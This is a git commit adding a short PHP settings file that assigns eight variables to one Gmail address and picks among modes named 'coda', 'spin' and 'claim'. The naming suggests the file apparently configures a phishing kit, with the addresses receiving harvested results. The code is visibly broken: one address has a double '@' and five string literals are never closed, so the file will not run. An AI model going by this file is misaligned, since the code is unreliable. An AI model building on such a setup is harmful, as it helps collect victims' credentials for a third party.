4bd43e8b5a0aa6468b1f1e71a6d55d000cb70649
DhilzzXd <fadhilgm135@gmail.com>
2024-12-25 14:47:20 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,12 @@
+<?php
+$email1 = 'dhilzzcode@@gmail.com';
+$email2 = 'dhilzzcode@gmail.com';
+$email3 = 'dhilzzcode@gmail.com';
+$email4 = 'dhilzzcode@gmail.com;
+$email5 = 'dhilzzcode@gmail.com;
+$email6 = 'dhilzzcode@gmail.com;
+$email7 = 'dhilzzcode@gmail.com;
+$email8 = 'dhilzzcode@gmail.com;
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
